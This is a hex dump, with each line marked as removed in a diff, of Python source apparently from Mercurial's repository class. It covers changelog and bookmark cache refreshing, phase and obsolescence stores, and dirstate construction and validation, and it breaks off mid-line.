-0000e330: 2020 2320 636f 6e64 6974 696f 6e20 6865    # condition he
-0000e340: 7265 2e0a 2020 2020 2020 2020 230a 2020  re..        #.  
-0000e350: 2020 2020 2020 2320 3129 2063 6861 6e67        # 1) chang
-0000e360: 656c 6f67 2063 6f6e 7465 6e74 2041 2069  elog content A i
-0000e370: 7320 7265 6164 0a20 2020 2020 2020 2023  s read.        #
-0000e380: 2032 2920 6f75 7473 6964 6520 7472 616e   2) outside tran
-0000e390: 7361 6374 696f 6e20 7570 6461 7465 2063  saction update c
-0000e3a0: 6861 6e67 656c 6f67 2074 6f20 636f 6e74  hangelog to cont
-0000e3b0: 656e 7420 420a 2020 2020 2020 2020 2320  ent B.        # 
-0000e3c0: 3329 206f 7574 7369 6465 2074 7261 6e73  3) outside trans
-0000e3d0: 6163 7469 6f6e 2075 7064 6174 6520 626f  action update bo
-0000e3e0: 6f6b 6d61 726b 2066 696c 6520 7265 6665  okmark file refe
-0000e3f0: 7272 696e 6720 746f 2063 6f6e 7465 6e74  rring to content
-0000e400: 2042 0a20 2020 2020 2020 2023 2034 2920   B.        # 4) 
-0000e410: 626f 6f6b 6d61 726b 7320 6669 6c65 2063  bookmarks file c
-0000e420: 6f6e 7465 6e74 2069 7320 7265 6164 2061  ontent is read a
-0000e430: 6e64 2066 696c 7465 7265 6420 6167 6169  nd filtered agai
-0000e440: 6e73 7420 6368 616e 6765 6c6f 672d 410a  nst changelog-A.
-0000e450: 2020 2020 2020 2020 230a 2020 2020 2020          #.      
-0000e460: 2020 2320 5768 656e 2074 6869 7320 6861    # When this ha
-0000e470: 7070 656e 732c 2062 6f6f 6b6d 6172 6b73  ppens, bookmarks
-0000e480: 2061 6761 696e 7374 206e 6f64 6573 206d   against nodes m
-0000e490: 6973 7369 6e67 2066 726f 6d20 4120 6172  issing from A ar
-0000e4a0: 6520 6472 6f70 7065 642e 0a20 2020 2020  e dropped..     
-0000e4b0: 2020 2023 0a20 2020 2020 2020 2023 2048     #.        # H
-0000e4c0: 6176 696e 6720 7468 6973 2068 6170 7065  aving this happe
-0000e4d0: 6e69 6e67 2064 7572 696e 6720 7265 6164  ning during read
-0000e4e0: 2069 7320 6e6f 7420 6772 6561 742c 2062   is not great, b
-0000e4f0: 7574 2069 7420 6265 636f 6d65 2077 6f72  ut it become wor
-0000e500: 7365 0a20 2020 2020 2020 2023 2077 6865  se.        # whe
-0000e510: 6e20 7468 6973 2068 6170 7065 6e20 6475  n this happen du
-0000e520: 7269 6e67 2077 7269 7465 2062 6563 6175  ring write becau
-0000e530: 7365 2074 6865 2062 6f6f 6b6d 6172 6b73  se the bookmarks
-0000e540: 2074 6f20 7468 6520 2275 6e6b 6e6f 776e   to the "unknown
-0000e550: 220a 2020 2020 2020 2020 2320 6e6f 6465  ".        # node
-0000e560: 7320 7769 6c6c 2062 6520 6472 6f70 7065  s will be droppe
-0000e570: 6420 666f 7220 676f 6f64 2e20 486f 7765  d for good. Howe
-0000e580: 7665 722c 2077 7269 7465 7320 6861 7070  ver, writes happ
-0000e590: 656e 2077 6974 6869 6e20 6c6f 636b 732e  en within locks.
-0000e5a0: 0a20 2020 2020 2020 2023 2054 6869 7320  .        # This 
-0000e5b0: 6c6f 636b 696e 6720 6d61 6b65 7320 6974  locking makes it
-0000e5c0: 2070 6f73 7369 626c 6520 746f 2068 6176   possible to hav
-0000e5d0: 6520 6120 7261 6365 2066 7265 6520 636f  e a race free co
-0000e5e0: 6e73 6973 7465 6e74 2072 6561 642e 0a20  nsistent read.. 
-0000e5f0: 2020 2020 2020 2023 2046 6f72 2074 6869         # For thi
-0000e600: 7320 7075 7270 6f73 6520 6461 7461 2072  s purpose data r
-0000e610: 6561 6420 6672 6f6d 2064 6973 6320 6265  ead from disc be
-0000e620: 666f 7265 206c 6f63 6b69 6e67 2020 6172  fore locking  ar
-0000e630: 650a 2020 2020 2020 2020 2320 2269 6e76  e.        # "inv
-0000e640: 616c 6964 6174 6564 2220 7269 6768 7420  alidated" right 
-0000e650: 6166 7465 7220 7468 6520 6c6f 636b 7320  after the locks 
-0000e660: 6172 6520 7461 6b65 6e2e 2054 6869 7320  are taken. This 
-0000e670: 696e 7661 6c69 6461 7469 6f6e 7320 6172  invalidations ar
-0000e680: 650a 2020 2020 2020 2020 2320 226c 6967  e.        # "lig
-0000e690: 6874 222c 2074 6865 2060 6669 6c65 6361  ht", the `fileca
-0000e6a0: 6368 6560 206d 6563 6861 6e69 736d 206b  che` mechanism k
-0000e6b0: 6565 7020 7468 6520 6461 7461 2069 6e20  eep the data in 
-0000e6c0: 6d65 6d6f 7279 2061 6e64 2077 696c 6c0a  memory and will.
-0000e6d0: 2020 2020 2020 2020 2320 7265 7573 6520          # reuse 
-0000e6e0: 7468 656d 2069 6620 7468 6520 756e 6465  them if the unde
-0000e6f0: 726c 7969 6e67 2066 696c 6573 2064 6964  rlying files did
-0000e700: 206e 6f74 2063 6861 6e67 6564 2e20 4e6f   not changed. No
-0000e710: 7420 7061 7273 696e 6720 7468 650a 2020  t parsing the.  
-0000e720: 2020 2020 2020 2320 7361 6d65 2064 6174        # same dat
-0000e730: 6120 6d75 6c74 6970 6c65 2074 696d 6573  a multiple times
-0000e740: 2068 656c 7073 2070 6572 666f 726d 616e   helps performan
-0000e750: 6365 732e 0a20 2020 2020 2020 2023 0a20  ces..        #. 
-0000e760: 2020 2020 2020 2023 2055 6e66 6f72 7475         # Unfortu
-0000e770: 6e61 7465 6c79 2069 6e20 7468 6520 6361  nately in the ca
-0000e780: 7365 2064 6573 6372 6962 6520 6162 6f76  se describe abov
-0000e790: 652c 2074 6865 2066 696c 6573 2074 7261  e, the files tra
-0000e7a0: 636b 6564 2062 7920 7468 650a 2020 2020  cked by the.    
-0000e7b0: 2020 2020 2320 626f 6f6b 6d61 726b 7320      # bookmarks 
-0000e7c0: 6669 6c65 2063 6163 6865 206d 6967 6874  file cache might
-0000e7d0: 206e 6f74 2068 6176 6520 6368 616e 6765   not have change
-0000e7e0: 642c 2062 7574 2074 6865 2069 6e2d 6d65  d, but the in-me
-0000e7f0: 6d6f 7279 0a20 2020 2020 2020 2023 2063  mory.        # c
-0000e800: 6f6e 7465 6e74 2069 7320 7374 696c 6c20  ontent is still 
-0000e810: 2277 726f 6e67 2220 6265 6361 7573 6520  "wrong" because 
-0000e820: 7765 2075 7365 6420 616e 206f 6c64 6572  we used an older
-0000e830: 2063 6861 6e67 656c 6f67 2063 6f6e 7465   changelog conte
-0000e840: 6e74 0a20 2020 2020 2020 2023 2074 6f20  nt.        # to 
-0000e850: 7072 6f63 6573 7320 7468 6520 6f6e 2d64  process the on-d
-0000e860: 6973 6b20 6461 7461 2e20 536f 2061 6674  isk data. So aft
-0000e870: 6572 206c 6f63 6b69 6e67 2c20 7468 6520  er locking, the 
-0000e880: 6368 616e 6765 6c6f 6720 776f 756c 6420  changelog would 
-0000e890: 6265 0a20 2020 2020 2020 2023 2072 6566  be.        # ref
-0000e8a0: 7265 7368 6564 2062 7574 2060 5f62 6f6f  reshed but `_boo
-0000e8b0: 6b6d 6172 6b73 6020 776f 756c 6420 6265  kmarks` would be
-0000e8c0: 2070 7265 7365 7276 6564 2e0a 2020 2020   preserved..    
-0000e8d0: 2020 2020 2320 4164 6469 6e67 2060 3030      # Adding `00
-0000e8e0: 6368 616e 6765 6c6f 672e 6960 2074 6f20  changelog.i` to 
-0000e8f0: 7468 6520 6c69 7374 206f 6620 7472 6163  the list of trac
-0000e900: 6b65 6420 6669 6c65 2069 7320 6e6f 740a  ked file is not.
-0000e910: 2020 2020 2020 2020 2320 656e 6f75 6768          # enough
-0000e920: 2c20 6265 6361 7573 6520 6174 2074 6865  , because at the
-0000e930: 2074 696d 6520 7765 2062 7569 6c64 2074   time we build t
-0000e940: 6865 2063 6f6e 7465 6e74 2066 6f72 2060  he content for `
-0000e950: 5f62 6f6f 6b6d 6172 6b73 6020 696e 0a20  _bookmarks` in. 
-0000e960: 2020 2020 2020 2023 2028 3429 2c20 7468         # (4), th
-0000e970: 6520 6368 616e 6765 6c6f 6720 6669 6c65  e changelog file
-0000e980: 2068 6173 2061 6c72 6561 6479 2064 6976   has already div
-0000e990: 6572 6765 6420 6672 6f6d 2074 6865 2063  erged from the c
-0000e9a0: 6f6e 7465 6e74 2075 7365 640a 2020 2020  ontent used.    
-0000e9b0: 2020 2020 2320 666f 7220 6c6f 6164 696e      # for loadin
-0000e9c0: 6720 6063 6861 6e67 656c 6f67 6020 696e  g `changelog` in
-0000e9d0: 2028 3129 0a20 2020 2020 2020 2023 0a20   (1).        #. 
-0000e9e0: 2020 2020 2020 2023 2054 6f20 7072 6576         # To prev
-0000e9f0: 656e 7420 7468 6520 6973 7375 652c 2077  ent the issue, w
-0000ea00: 6520 666f 7263 6520 7468 6520 6368 616e  e force the chan
-0000ea10: 6765 6c6f 6720 746f 2062 6520 6578 706c  gelog to be expl
-0000ea20: 6963 6974 6c79 0a20 2020 2020 2020 2023  icitly.        #
-0000ea30: 2072 656c 6f61 6465 6420 7768 696c 6520   reloaded while 
-0000ea40: 636f 6d70 7574 696e 6720 605f 626f 6f6b  computing `_book
-0000ea50: 6d61 726b 7360 2e20 5468 6520 6461 7461  marks`. The data
-0000ea60: 2072 6163 6520 6361 6e20 7374 696c 6c20   race can still 
-0000ea70: 6861 7070 656e 0a20 2020 2020 2020 2023  happen.        #
-0000ea80: 2077 6974 686f 7574 2074 6865 206c 6f63   without the loc
-0000ea90: 6b20 2877 6974 6820 6120 6e61 7272 6f77  k (with a narrow
-0000eaa0: 6572 2077 696e 646f 7729 2c20 6275 7420  er window), but 
-0000eab0: 6974 2077 6f75 6c64 206e 6f20 6c6f 6e67  it would no long
-0000eac0: 6572 2067 6f0a 2020 2020 2020 2020 2320  er go.        # 
-0000ead0: 756e 6465 7465 6374 6564 2064 7572 696e  undetected durin
-0000eae0: 6720 7468 6520 6c6f 636b 2074 696d 6520  g the lock time 
-0000eaf0: 7265 6672 6573 682e 0a20 2020 2020 2020  refresh..       
-0000eb00: 2023 0a20 2020 2020 2020 2023 2054 6865   #.        # The
-0000eb10: 206e 6577 2073 6368 6564 756c 6520 6973   new schedule is
-0000eb20: 2061 7320 666f 6c6c 6f77 0a20 2020 2020   as follow.     
-0000eb30: 2020 2023 0a20 2020 2020 2020 2023 2031     #.        # 1
-0000eb40: 2920 6669 6c65 6361 6368 6520 6c6f 6769  ) filecache logi
-0000eb50: 6320 6465 7465 6374 2074 6861 7420 605f  c detect that `_
-0000eb60: 626f 6f6b 6d61 726b 7360 206e 6565 6473  bookmarks` needs
-0000eb70: 2074 6f20 6265 2063 6f6d 7075 7465 640a   to be computed.
-0000eb80: 2020 2020 2020 2020 2320 3229 2063 6163          # 2) cac
-0000eb90: 6865 7374 6174 2066 6f72 2060 626f 6f6b  hestat for `book
-0000eba0: 6d61 726b 7360 2061 6e64 2060 6368 616e  marks` and `chan
-0000ebb0: 6765 6c6f 6760 2061 7265 2063 6170 7475  gelog` are captu
-0000ebc0: 7265 6420 2866 6f72 2062 6f6f 6b29 0a20  red (for book). 
-0000ebd0: 2020 2020 2020 2023 2033 2920 5765 2066         # 3) We f
-0000ebe0: 6f72 6365 2060 6368 616e 6765 6c6f 6760  orce `changelog`
-0000ebf0: 2066 696c 6563 6163 6865 2074 6f20 6265   filecache to be
-0000ec00: 2074 6573 7465 640a 2020 2020 2020 2020   tested.        
-0000ec10: 2320 3429 2063 6163 6865 7374 6174 2066  # 4) cachestat f
-0000ec20: 6f72 2060 6368 616e 6765 6c6f 6760 2061  or `changelog` a
-0000ec30: 7265 2063 6170 7475 7265 6420 2866 6f72  re captured (for
-0000ec40: 2063 6861 6e67 656c 6f67 290a 2020 2020   changelog).    
-0000ec50: 2020 2020 2320 3529 2060 5f62 6f6f 6b6d      # 5) `_bookm
-0000ec60: 6172 6b73 6020 6973 2063 6f6d 7075 7465  arks` is compute
-0000ec70: 6420 616e 6420 6361 6368 6564 0a20 2020  d and cached.   
-0000ec80: 2020 2020 2023 0a20 2020 2020 2020 2023       #.        #
-0000ec90: 2054 6865 2073 7465 7020 696e 2028 3329   The step in (3)
-0000eca0: 2065 6e73 7572 6520 7765 2068 6176 6520   ensure we have 
-0000ecb0: 6120 6368 616e 6765 6c6f 6720 6174 206c  a changelog at l
-0000ecc0: 6561 7374 2061 7320 7265 6365 6e74 2061  east as recent a
-0000ecd0: 7320 7468 650a 2020 2020 2020 2020 2320  s the.        # 
-0000ece0: 6361 6368 6520 7374 6174 2063 6f6d 7075  cache stat compu
-0000ecf0: 7465 6420 696e 2028 3129 2e20 4173 2061  ted in (1). As a
-0000ed00: 2072 6573 756c 7420 6174 206c 6f63 6b69   result at locki
-0000ed10: 6e67 2074 696d 653a 0a20 2020 2020 2020  ng time:.       
-0000ed20: 2023 2020 2a20 6966 2074 6865 2063 6861   #  * if the cha
-0000ed30: 6e67 656c 6f67 2064 6964 206e 6f74 2063  ngelog did not c
-0000ed40: 6861 6e67 6564 2073 696e 6365 2028 3129  hanged since (1)
-0000ed50: 202d 3e20 7765 2063 616e 2072 6575 7365   -> we can reuse
-0000ed60: 2074 6865 2064 6174 610a 2020 2020 2020   the data.      
-0000ed70: 2020 2320 202a 206f 7468 6572 7769 7365    #  * otherwise
-0000ed80: 202d 3e20 7468 6520 626f 6f6b 6d61 726b   -> the bookmark
-0000ed90: 7320 6765 7420 7265 6672 6573 6865 642e  s get refreshed.
-0000eda0: 0a20 2020 2020 2020 2073 656c 662e 5f72  .        self._r
-0000edb0: 6566 7265 7368 6368 616e 6765 6c6f 6728  efreshchangelog(
-0000edc0: 290a 2020 2020 2020 2020 7265 7475 726e  ).        return
-0000edd0: 2062 6f6f 6b6d 6172 6b73 2e62 6d73 746f   bookmarks.bmsto
-0000ede0: 7265 2873 656c 6629 0a0a 2020 2020 6465  re(self)..    de
-0000edf0: 6620 5f72 6566 7265 7368 6368 616e 6765  f _refreshchange
-0000ee00: 6c6f 6728 7365 6c66 293a 0a20 2020 2020  log(self):.     
-0000ee10: 2020 2022 2222 6d61 6b65 2073 7572 6520     """make sure 
-0000ee20: 7468 6520 696e 206d 656d 6f72 7920 6368  the in memory ch
-0000ee30: 616e 6765 6c6f 6720 6d61 7463 6820 7468  angelog match th
-0000ee40: 6520 6f6e 2d64 6973 6b20 6f6e 6522 2222  e on-disk one"""
-0000ee50: 0a20 2020 2020 2020 2069 6620 2763 6861  .        if 'cha
-0000ee60: 6e67 656c 6f67 2720 696e 2076 6172 7328  ngelog' in vars(
-0000ee70: 7365 6c66 2920 616e 6420 7365 6c66 2e63  self) and self.c
-0000ee80: 7572 7265 6e74 7472 616e 7361 6374 696f  urrenttransactio
-0000ee90: 6e28 2920 6973 204e 6f6e 653a 0a20 2020  n() is None:.   
-0000eea0: 2020 2020 2020 2020 2064 656c 2073 656c           del sel
-0000eeb0: 662e 6368 616e 6765 6c6f 670a 0a20 2020  f.changelog..   
-0000eec0: 2040 7072 6f70 6572 7479 0a20 2020 2064   @property.    d
-0000eed0: 6566 205f 6163 7469 7665 626f 6f6b 6d61  ef _activebookma
-0000eee0: 726b 2873 656c 6629 3a0a 2020 2020 2020  rk(self):.      
-0000eef0: 2020 7265 7475 726e 2073 656c 662e 5f62    return self._b
-0000ef00: 6f6f 6b6d 6172 6b73 2e61 6374 6976 650a  ookmarks.active.
-0000ef10: 0a20 2020 2023 205f 7068 6173 6573 6574  .    # _phaseset
-0000ef20: 7320 6465 7065 6e64 206f 6e20 6368 616e  s depend on chan
-0000ef30: 6765 6c6f 672e 2077 6861 7420 7765 206e  gelog. what we n
-0000ef40: 6565 6420 6973 2074 6f20 6361 6c6c 0a20  eed is to call. 
-0000ef50: 2020 2023 205f 7068 6173 6563 6163 6865     # _phasecache
-0000ef60: 2e69 6e76 616c 6964 6174 6528 2920 6966  .invalidate() if
-0000ef70: 2027 3030 6368 616e 6765 6c6f 672e 6927   '00changelog.i'
-0000ef80: 2077 6173 2063 6861 6e67 6564 2c20 6275   was changed, bu
-0000ef90: 7420 6974 0a20 2020 2023 2063 616e 2774  t it.    # can't
-0000efa0: 2062 6520 6561 7369 6c79 2065 7870 7265   be easily expre
-0000efb0: 7373 6564 2069 6e20 6669 6c65 6361 6368  ssed in filecach
-0000efc0: 6520 6d65 6368 616e 6973 6d2e 0a20 2020  e mechanism..   
-0000efd0: 2040 7374 6f72 6563 6163 6865 2862 2770   @storecache(b'p
-0000efe0: 6861 7365 726f 6f74 7327 2c20 6227 3030  haseroots', b'00
-0000eff0: 6368 616e 6765 6c6f 672e 6927 290a 2020  changelog.i').  
-0000f000: 2020 6465 6620 5f70 6861 7365 6361 6368    def _phasecach
-0000f010: 6528 7365 6c66 293a 0a20 2020 2020 2020  e(self):.       
-0000f020: 2072 6574 7572 6e20 7068 6173 6573 2e70   return phases.p
-0000f030: 6861 7365 6361 6368 6528 7365 6c66 2c20  hasecache(self, 
-0000f040: 7365 6c66 2e5f 7068 6173 6564 6566 6175  self._phasedefau
-0000f050: 6c74 7329 0a0a 2020 2020 4073 746f 7265  lts)..    @store
-0000f060: 6361 6368 6528 6227 6f62 7373 746f 7265  cache(b'obsstore
-0000f070: 2729 0a20 2020 2064 6566 206f 6273 7374  ').    def obsst
-0000f080: 6f72 6528 7365 6c66 293a 0a20 2020 2020  ore(self):.     
-0000f090: 2020 2072 6574 7572 6e20 6f62 736f 6c65     return obsole
-0000f0a0: 7465 2e6d 616b 6573 746f 7265 2873 656c  te.makestore(sel
-0000f0b0: 662e 7569 2c20 7365 6c66 290a 0a20 2020  f.ui, self)..   
-0000f0c0: 2040 6368 616e 6765 6c6f 6763 6163 6865   @changelogcache
-0000f0d0: 2829 0a20 2020 2064 6566 2063 6861 6e67  ().    def chang
-0000f0e0: 656c 6f67 2872 6570 6f29 3a0a 2020 2020  elog(repo):.    
-0000f0f0: 2020 2020 2320 6c6f 6164 2064 6972 7374      # load dirst
-0000f100: 6174 6520 6265 666f 7265 2063 6861 6e67  ate before chang
-0000f110: 656c 6f67 2074 6f20 6176 6f69 6420 7261  elog to avoid ra
-0000f120: 6365 2073 6565 2069 7373 7565 3633 3033  ce see issue6303
-0000f130: 0a20 2020 2020 2020 2072 6570 6f2e 6469  .        repo.di
-0000f140: 7273 7461 7465 2e70 7265 6665 7463 685f  rstate.prefetch_
-0000f150: 7061 7265 6e74 7328 290a 2020 2020 2020  parents().      
-0000f160: 2020 7265 7475 726e 2072 6570 6f2e 7374    return repo.st
-0000f170: 6f72 652e 6368 616e 6765 6c6f 6728 0a20  ore.changelog(. 
-0000f180: 2020 2020 2020 2020 2020 2074 786e 7574             txnut
-0000f190: 696c 2e6d 6179 6861 7665 7065 6e64 696e  il.mayhavependin
-0000f1a0: 6728 7265 706f 2e72 6f6f 7429 2c0a 2020  g(repo.root),.  
-0000f1b0: 2020 2020 2020 2020 2020 636f 6e63 7572            concur
-0000f1c0: 7265 6e63 7963 6865 636b 6572 3d72 6576  rencychecker=rev
-0000f1d0: 6c6f 6763 6865 636b 6572 2e67 6574 5f63  logchecker.get_c
-0000f1e0: 6865 636b 6572 2872 6570 6f2e 7569 2c20  hecker(repo.ui, 
-0000f1f0: 6227 6368 616e 6765 6c6f 6727 292c 0a20  b'changelog'),. 
-0000f200: 2020 2020 2020 2029 0a0a 2020 2020 406d         )..    @m
-0000f210: 616e 6966 6573 746c 6f67 6361 6368 6528  anifestlogcache(
-0000f220: 290a 2020 2020 6465 6620 6d61 6e69 6665  ).    def manife
-0000f230: 7374 6c6f 6728 7365 6c66 293a 0a20 2020  stlog(self):.   
-0000f240: 2020 2020 2072 6574 7572 6e20 7365 6c66       return self
-0000f250: 2e73 746f 7265 2e6d 616e 6966 6573 746c  .store.manifestl
-0000f260: 6f67 2873 656c 662c 2073 656c 662e 5f73  og(self, self._s
-0000f270: 746f 7265 6e61 7272 6f77 6d61 7463 6829  torenarrowmatch)
-0000f280: 0a0a 2020 2020 4075 6e66 696c 7465 7265  ..    @unfiltere
-0000f290: 6470 726f 7065 7274 7963 6163 6865 0a20  dpropertycache. 
-0000f2a0: 2020 2064 6566 2064 6972 7374 6174 6528     def dirstate(
-0000f2b0: 7365 6c66 293a 0a20 2020 2020 2020 2069  self):.        i
-0000f2c0: 6620 7365 6c66 2e5f 6469 7273 7461 7465  f self._dirstate
-0000f2d0: 2069 7320 4e6f 6e65 3a0a 2020 2020 2020   is None:.      
-0000f2e0: 2020 2020 2020 7365 6c66 2e5f 6469 7273        self._dirs
-0000f2f0: 7461 7465 203d 2073 656c 662e 5f6d 616b  tate = self._mak
-0000f300: 6564 6972 7374 6174 6528 290a 2020 2020  edirstate().    
-0000f310: 2020 2020 656c 7365 3a0a 2020 2020 2020      else:.      
-0000f320: 2020 2020 2020 7365 6c66 2e5f 6469 7273        self._dirs
-0000f330: 7461 7465 2e72 6566 7265 7368 2829 0a20  tate.refresh(). 
-0000f340: 2020 2020 2020 2072 6574 7572 6e20 7365         return se
-0000f350: 6c66 2e5f 6469 7273 7461 7465 0a0a 2020  lf._dirstate..  
-0000f360: 2020 6465 6620 5f6d 616b 6564 6972 7374    def _makedirst
-0000f370: 6174 6528 7365 6c66 293a 0a20 2020 2020  ate(self):.     
-0000f380: 2020 2022 2222 4578 7465 6e73 696f 6e20     """Extension 
-0000f390: 706f 696e 7420 666f 7220 7772 6170 7069  point for wrappi
-0000f3a0: 6e67 2074 6865 2064 6972 7374 6174 6520  ng the dirstate 
-0000f3b0: 7065 722d 7265 706f 2e22 2222 0a20 2020  per-repo.""".   
-0000f3c0: 2020 2020 2073 7061 7273 656d 6174 6368       sparsematch
-0000f3d0: 666e 203d 204e 6f6e 650a 2020 2020 2020  fn = None.      
-0000f3e0: 2020 6966 2073 7061 7273 652e 7573 655f    if sparse.use_
-0000f3f0: 7370 6172 7365 2873 656c 6629 3a0a 2020  sparse(self):.  
-0000f400: 2020 2020 2020 2020 2020 7370 6172 7365            sparse
-0000f410: 6d61 7463 6866 6e20 3d20 6c61 6d62 6461  matchfn = lambda
-0000f420: 3a20 7370 6172 7365 2e6d 6174 6368 6572  : sparse.matcher
-0000f430: 2873 656c 6629 0a20 2020 2020 2020 2076  (self).        v
-0000f440: 325f 7265 7120 3d20 7265 7175 6972 656d  2_req = requirem
-0000f450: 656e 7473 6d6f 642e 4449 5253 5441 5445  entsmod.DIRSTATE
-0000f460: 5f56 325f 5245 5155 4952 454d 454e 540a  _V2_REQUIREMENT.
-0000f470: 2020 2020 2020 2020 7468 203d 2072 6571          th = req
-0000f480: 7569 7265 6d65 6e74 736d 6f64 2e44 4952  uirementsmod.DIR
-0000f490: 5354 4154 455f 5452 4143 4b45 445f 4849  STATE_TRACKED_HI
-0000f4a0: 4e54 5f56 310a 2020 2020 2020 2020 7573  NT_V1.        us
-0000f4b0: 655f 6469 7273 7461 7465 5f76 3220 3d20  e_dirstate_v2 = 
-0000f4c0: 7632 5f72 6571 2069 6e20 7365 6c66 2e72  v2_req in self.r
-0000f4d0: 6571 7569 7265 6d65 6e74 730a 2020 2020  equirements.    
-0000f4e0: 2020 2020 7573 655f 7472 6163 6b65 645f      use_tracked_
-0000f4f0: 6869 6e74 203d 2074 6820 696e 2073 656c  hint = th in sel
-0000f500: 662e 7265 7175 6972 656d 656e 7473 0a0a  f.requirements..
-0000f510: 2020 2020 2020 2020 7265 7475 726e 2064          return d
-0000f520: 6972 7374 6174 652e 6469 7273 7461 7465  irstate.dirstate
-0000f530: 280a 2020 2020 2020 2020 2020 2020 7365  (.            se
-0000f540: 6c66 2e76 6673 2c0a 2020 2020 2020 2020  lf.vfs,.        
-0000f550: 2020 2020 7365 6c66 2e75 692c 0a20 2020      self.ui,.   
-0000f560: 2020 2020 2020 2020 2073 656c 662e 726f           self.ro
-0000f570: 6f74 2c0a 2020 2020 2020 2020 2020 2020  ot,.            
-0000f580: 7365 6c66 2e5f 6469 7273 7461 7465 7661  self._dirstateva
-0000f590: 6c69 6461 7465 2c0a 2020 2020 2020 2020  lidate,.        
-0000f5a0: 2020 2020 7370 6172 7365 6d61 7463 6866      sparsematchf
-0000f5b0: 6e2c 0a20 2020 2020 2020 2020 2020 2073  n,.            s
-0000f5c0: 656c 662e 6e6f 6465 636f 6e73 7461 6e74  elf.nodeconstant
-0000f5d0: 732c 0a20 2020 2020 2020 2020 2020 2075  s,.            u
-0000f5e0: 7365 5f64 6972 7374 6174 655f 7632 2c0a  se_dirstate_v2,.
-0000f5f0: 2020 2020 2020 2020 2020 2020 7573 655f              use_
-0000f600: 7472 6163 6b65 645f 6869 6e74 3d75 7365  tracked_hint=use
-0000f610: 5f74 7261 636b 6564 5f68 696e 742c 0a20  _tracked_hint,. 
-0000f620: 2020 2020 2020 2029 0a0a 2020 2020 6465         )..    de
-0000f630: 6620 5f64 6972 7374 6174 6576 616c 6964  f _dirstatevalid
-0000f640: 6174 6528 7365 6c66 2c20 6e6f 6465 293a  ate(self, node):
-0000f650: 0a20 2020 2020 2020 206f 6b61 7920 3d20  .        okay = 
-0000f660: 5472 7565 0a20 2020 2020 2020 2074 7279  True.        try
-0000f670: 3a0a 2020 2020 2020 2020 2020 2020 7365  :.            se
-0000f680: 6c66 2e63 6861 6e67 656c 6f67 2e72 6576  lf.changelog.rev
-0000f690: 286e 6f64 6529 0a20 2020 2020 2020 2065  (node).        e
-0000f6a0: 7863 6570 7420 6572 726f 722e 4c6f 6f6b  xcept error.Look
-0000f6b0: 7570 4572 726f 723a 0a20 2020 2020 2020  upError:.       
-0000f6c0: 2020 2020 2023 2049 6620 7468 6520 7061       # If the pa
-0000f6d0: 7265 6e74 2061 7265 2075 6e6b 6e6f 776e  rent are unknown
-0000f6e0: 2069 7420 6d69 6768 7420 6a75 7374 2062   it might just b
-0000f6f0: 6520 6265 6361 7573 6520 7468 6520 6368  e because the ch
-0000f700: 616e 6765 6c6f 670a 2020 2020 2020 2020  angelog.        
-0000f710: 2020 2020 2320 696e 206d 656d 6f72 7920      # in memory 
-0000f720: 6973 206c 6167 6769 6e67 2062 6568 696e  is lagging behin
-0000f730: 6420 7468 6520 6469 7273 7461 7465 2069  d the dirstate i
-0000f740: 6e20 6d65 6d6f 7279 2e20 536f 2074 7279  n memory. So try
-0000f750: 2074 6f0a 2020 2020 2020 2020 2020 2020   to.            
-0000f760: 2320 7265 6672 6573 6820 7468 6520 6368  # refresh the ch
-0000f770: 616e 6765 6c6f 6720 6669 7273 742e 0a20  angelog first.. 
-0000f780: 2020 2020 2020 2020 2020 2023 0a20 2020             #.   
-0000f790: 2020 2020 2020 2020 2023 2057 6520 6f6e           # We on
-0000f7a0: 6c79 2064 6f20 736f 2069 6620 7765 2064  ly do so if we d
-0000f7b0: 6f6e 2774 2068 6f6c 6420 7468 6520 6c6f  on't hold the lo
-0000f7c0: 636b 2c20 6966 2077 6520 646f 2068 6f6c  ck, if we do hol
-0000f7d0: 6420 7468 6520 6c6f 636b 0a20 2020 2020  d the lock.     
-0000f7e0: 2020 2020 2020 2023 2074 6865 2069 6e76         # the inv
-0000f7f0: 616c 6964 6174 696f 6e20 6174 2074 6861  alidation at tha
-0000f800: 7420 7469 6d65 2073 686f 756c 6420 6861  t time should ha
-0000f810: 7665 2074 616b 656e 2063 6172 6520 6f66  ve taken care of
-0000f820: 2074 6869 7320 616e 640a 2020 2020 2020   this and.      
-0000f830: 2020 2020 2020 2320 736f 6d65 7468 696e        # somethin
-0000f840: 6720 6973 2076 6572 7920 6669 7368 792e  g is very fishy.
-0000f850: 0a20 2020 2020 2020 2020 2020 2069 6620  .            if 
-0000f860: 7365 6c66 2e63 7572 7265 6e74 6c6f 636b  self.currentlock
-0000f870: 2829 2069 7320 4e6f 6e65 3a0a 2020 2020  () is None:.    
-0000f880: 2020 2020 2020 2020 2020 2020 7365 6c66              self
-0000f890: 2e69 6e76 616c 6964 6174 6528 290a 2020  .invalidate().  
-0000f8a0: 2020 2020 2020 2020 2020 2020 2020 7472                tr
-0000f8b0: 793a 0a20 2020 2020 2020 2020 2020 2020  y:.             
-0000f8c0: 2020 2020 2020 2073 656c 662e 6368 616e         self.chan
-0000f8d0: 6765 6c6f 672e 7265 7628 6e6f 6465 290a  gelog.rev(node).
-0000f8e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0000f8f0: 6578 6365 7074 2065 7272 6f72 2e4c 6f6f  except error.Loo
-0000f900: 6b75 7045 7272 6f72 3a0a 2020 2020 2020  kupError:.      
-0000f910: 2020 2020 2020 2020 2020 2020 2020 6f6b                ok
-0000f920: 6179 203d 2046 616c 7365 0a20 2020 2020  ay = False.     
-0000f930: 2020 2020 2020 2065 6c73 653a 0a20 2020         else:.   
-0000f940: 2020 2020 2020 2020 2020 2020 2023 2058               # X
-0000f950: 5858 2077 6520 7368 6f75 6c64 2063 6f6e  XX we should con
-0000f960: 7369 6465 7220 7261 6973 696e 6720 616e  sider raising an
-0000f970: 2065 7272 6f72 2068 6572 652e 0a20 2020   error here..   
-0000f980: 2020 2020 2020 2020 2020 2020 206f 6b61               oka
-0000f990: 7920 3d20 4661 6c73 650a 2020 2020 2020  y = False.      
-0000f9a0: 2020 6966 206f 6b61 793a 0a20 2020 2020    if okay:.     
-0000f9b0: 2020 2020 2020 2072 6574 7572 6e20 6e6f         return no
-0000f9c0: 6465 0a20 2020 2020 2020 2065 6c73 653a  de.        else:
-0000f9d0: 0a20 2020 2020 2020 2020 2020 2069 6620  .            if 
-0000f9e0: 6e6f 7420 7365 6c66 2e5f 6469 7273 7461  not self._dirsta
-0000f9f0: 7465 7661 6c69 6461 7465 7761 726e 6564  tevalidatewarned
-0000fa00: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
-0000fa10: 2020 7365 6c66 2e5f 6469 7273 7461 7465    self._dirstate
